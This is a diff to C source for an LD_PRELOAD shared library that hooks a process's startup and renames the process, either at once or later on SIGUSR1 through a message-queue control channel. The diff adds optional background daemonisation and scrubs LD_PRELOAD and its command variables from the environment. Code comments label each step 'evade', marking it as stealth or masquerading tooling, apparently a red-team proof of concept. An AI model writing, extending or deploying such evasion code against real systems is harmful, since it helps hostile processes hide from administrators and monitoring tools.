@@ -12,6 +12,8 @@
 #include <errno.h>
 #include <unistd.h>
 #include <time.h>
+#include <fcntl.h>
+#include <stdarg.h>
 
 //#include <dlfcn.h>
 
@@ -57,11 +59,16 @@ intact values in:
 char ** largv = NULL;
 int     largc;
 char ** lenvp = NULL;
-char ** commands = NULL;
-int     cargc;
-char ** noncommands = NULL;
 
 #define MAX_MESG 128
+
+struct comm {
+	int cmd_id;
+	 union cmd_t {
+		int  msgq_no;
+		char cmd_args[MAX_MESG];
+	 } m;
+} commands;
 
 // structure and indetifiers for message queue 
 struct mesg_buffer {
@@ -75,9 +82,10 @@ key_t key;
 
 void setRandezvous(void){
 
-	srand(time(NULL)); 
+	//srand(time(NULL)); 
    // ftok to generate unique key 
-   key = ftok(".", rand());
+	
+   key = ftok(".", commands.m.msgq_no);
 
    // msgget wants a message queue with info, 
    // create if not present,
@@ -93,14 +101,29 @@ void setRandezvous(void){
 
 void SetProcessName(void){
 
-    // msgrcv to receive message 
-   msgrcv(msgid, &message, sizeof(message), 1, IPC_NOWAIT);
-
    char* procname = message.mesg_text;
 
-   // to destroy the message queue  (allow one rename)
-   msgctl(msgid, IPC_RMID, NULL); 
-   printf("message q destroyed: %d\n", msgid); 
+	switch (commands.cmd_id){
+		case 1:
+			printf("immediate static\n");
+   		procname = commands.m.cmd_args; 
+			break;
+		case 2:
+			printf("delayed static\n");
+   		procname = commands.m.cmd_args; 
+			break;
+		case 3:
+			printf("delayed dynamic\n");
+			// msgrcv to receive message 
+			msgrcv(msgid, &message, sizeof(message), 1, IPC_NOWAIT);
+
+			// to destroy the message queue  (allow one rename)
+			msgctl(msgid, IPC_RMID, NULL); 
+			printf("message q destroyed: %d\n", msgid); 
+			break;
+		default:
+			printf("invalid command\n");
+	}
 
 
    /* 
@@ -169,126 +192,134 @@ void cleanEnv(void){
         memset(*lenvp, 0, strlen(*lenvp));
       if (strncmp(*lenvp, "LD_CMD=", 7) == 0)
         memset(*lenvp, 0, strlen(*lenvp));
+      if (strncmp(*lenvp, "LD_BG=", 6) == 0)
+        memset(*lenvp, 0, strlen(*lenvp));
 
       lenvp++;
     }
 
 	 // b. remove from process memory if present to be sure
 	 unsetenv("LD_PRELOAD"); 
+	 unsetenv("LD_CMD"); 
+	 unsetenv("LD_BG"); 
 }
 
+void die(const char* format, ...){
 
-
-
-// Used to accept argv arguments that may be interpreted as commands.
-int OLDcheckCommands(void){
-
-	int  c = 0;
-	int  n = 0;
-	
-	if (1 < largc) {
-    for (int i=0; i<largc; i++) {
-
-#ifdef PSDEBUG
-		 printf("analysing arg: %s\n", largv[i]);
-#endif
-	    int last_pos = strlen(largv[i])-1;
-	    int command_len = strlen(largv[i]);
-
-			//&& 0 <= last_pos
-		 printf("\targ last pos: %d\n", last_pos);
-		 printf("\targ value first pos: %c\n", largv[i][0]);
-
-
-		 // Record only commands
-       if ( strncmp(largv[i], "@", 1) == 0 ){
-		 	printf("\targ '@' present in compare as first char: %c\n", largv[i][0]);
-		 	printf("\targ '@' present in compare as last char: %c\n", largv[i][last_pos]);
-		 	commands = (char **)realloc(commands, (sizeof(char*) * (c+1)) );
-		 	if( NULL == commands) {
-            fprintf(stderr, "Error: Failed to allocate enough memory!\n");
-       	}else{
-
-
-		 		printf("command_len: %d\n", command_len);
-				if (command_len >= 2) { 
-
-					//remove '@'s,
-					memmove(largv[i], largv[i]+1, command_len -2 );
-					largv[i][command_len - 2] = '\0';
-		 			commands[c] = strdup(largv[i]);
-				}	
-				/* 
-					Optional: NOP out commands from argv. 
-				   WARNING: callee sill receives empty placeholders for argvs we deleted. 
-
-					TODO: I was not able to replace argv with noncommands due to realloc() 
-							not guaranteeing in place buffer reallocation
-				*/
-
-     			memset(largv[i], 0, strlen(largv[i]));
-		 		++c;
-		 	}
-
-		 // Record only non-commands: real argv
-		 }else{
-		 	noncommands = (char **)realloc(noncommands, (sizeof(char*) * (n+1)) );
-		 	if( NULL == noncommands) {
-            fprintf(stderr, "Error: Failed to allocate enough memory!\n");
-       	}else{
-		 		noncommands[n] = strdup(largv[i]);
-		 		++n;
-		   }
-			
-		 }
-     }
-	}
-
-#ifdef PSDEBUG
-	if (n > 0){
-   	printf("Non-Command args: \n");
-		for( int i = 0; i < n; ++i) {
-			  printf("\t%d) \"%s\"\n", i, noncommands[i]);
-		}
-	}
-
-	if (c > 0){
-   	printf("Command args: \n");
-		for( int i = 0; i < c; ++i) {
-			  printf("\t%d) \"%s\"\n", i, commands[i]);
-		}
-	}
-#endif
-
-	cargc=c;
-	return cargc;
+   va_list vargs;
+   va_start (vargs, format);
+   vfprintf (stderr, format, vargs);
+   fprintf (stderr, ".\n");
+   va_end (vargs);
+	exit(EXIT_FAILURE);
 }
+
+int backgroundDaemonLeader(void){
+	fprintf(stderr, "in background leader");
+
+
+    // Fork, allowing the parent process to terminate.
+    pid_t pid = fork();
+    if (pid == -1) {
+        die("failed to fork while daemonising (errno=%d)",errno);
+    } else if (pid != 0) {
+        _exit(0);
+    }
+
+    // Start a new session for the daemon.
+    if (setsid()==-1) {
+        die("failed to become a session leader while daemonising(errno=%d)",errno);
+    }
+
+    // Fork again, allowing the parent process to terminate.
+    signal(SIGHUP,SIG_IGN);
+    pid=fork();
+    if (pid == -1) {
+        die("failed to fork while daemonising (errno=%d)",errno);
+    } else if (pid != 0) {
+        _exit(0);
+    }
+
+    // Set the current working directory to the root directory.
+    if (chdir("/") == -1) {
+        die("failed to change working directory while daemonising (errno=%d)",errno);
+    }
+
+    // Set the user file creation mask to zero.
+    umask(0);
+
+    // Close then reopen standard file descriptors.
+    close(STDIN_FILENO);
+    close(STDOUT_FILENO);
+    close(STDERR_FILENO);
+    if (open("/dev/null",O_RDONLY) == -1) {
+        die("failed to reopen stdin while daemonising (errno=%d)",errno);
+    }
+    if (open("/dev/null",O_WRONLY) == -1) {
+        die("failed to reopen stdout while daemonising (errno=%d)",errno);
+    }
+    if (open("/dev/null",O_RDWR) == -1) {
+        die("failed to reopen stderr while daemonising (errno=%d)",errno);
+    }
+   return 0;
+}
+
 
 int processCommands(void){
 
-	char *cmds = NULL;
-	char *cmd, *key, *val;
+	char *cmd=NULL, *key=NULL, *val=NULL;
+	int cmd_len, cmd_len_limit=128;
 
-	if ( (cmds = (char*) getenv("LD_CMD")) == NULL ){
+	if ( (cmd = (char*) getenv("LD_CMD")) == NULL ){
 		printf("Invalid LD_CMD");
 	   return 0;
 
 	}else{
-		printf("LD_CMDi: %s\n", cmds);
+		printf("LD_CMD: %s\n", cmd);
 
-		cmd = strdup(cmds); 
+		cmd = strdup(cmd); 
 		key = strtok(cmd, ":");
 		val = strtok(NULL, ":");
 		printf("%s => %s\n", key, val);
 
-		if ( strcmp(key, "r") == 0 ){
+		cmd_len = strlen(val);
+		if (cmd_len > (cmd_len_limit))
+			cmd_len = cmd_len_limit;
+
+
+
+		// immediately
+		if ( strncmp(key, "r", 1) == 0 ){
+
 				printf("imediate rename to static(%s)\n", val);
-		} else if ( strcmp(key, "R") == 0 ){
+				commands.cmd_id=1;	
+				strncpy(commands.m.cmd_args, val, cmd_len) ;	
+				printf("static name (%s)\n", val);
+		      signal(SIGUSR1, sig_handler); 
+				kill(getpid(),SIGUSR1);
+
+		// on signal
+		} else if ( strncmp(key, "R", 1) == 0 ){
 				printf("delayed rename to static(%s)\n", val);
-		} else if ( strcmp(key, "M") == 0 ){
+				commands.cmd_id=2;	
+				strncpy(commands.m.cmd_args, val, cmd_len) ;	
+				printf("static name (%s)\n", val);
+		      // evade: wait for external command
+		      signal(SIGUSR1, sig_handler); 
+
+		// on signal and mesgq
+		} else if ( strncmp(key, "M", 1) == 0 ){
+				commands.cmd_id=3;	
+				commands.m.msgq_no = atoi(val) ;	
 				printf("delayed rename to dynamic (method: %s)\n", val);
+				// evade: establish control channel
+				setRandezvous();
+		      // evade: wait for external command
+		      signal(SIGUSR1, sig_handler); 
+
+		// on signal 
 		} else {
-				printf("unsupported: %s\n", key);
+				printf("error: unsupported command: %s\n", key);
 		}
 	}
 
@@ -312,17 +343,16 @@ __attribute__((constructor)) static void myctor(int argc, char **argv, char** en
     }
 #endif
 
-	 if (processCommands() > 0){
+	
+	char * cmd=NULL;
+	if ( (cmd = (char*) getenv("LD_BG")) != NULL ){
+	 	backgroundDaemonLeader();
+	}
 
-		 // evade: establish control channel
-		 setRandezvous();
+	processCommands();
 
-		 // evade: wait for external command
-		 signal(SIGUSR1, sig_handler); 
-	 }
-
-	 // always evade: clean LD_PRELOAD pointers
-	 cleanEnv();
+	 // always evade: clean LD_PRELOAD pointers, LD_CMD
+	cleanEnv();
 
 }
 
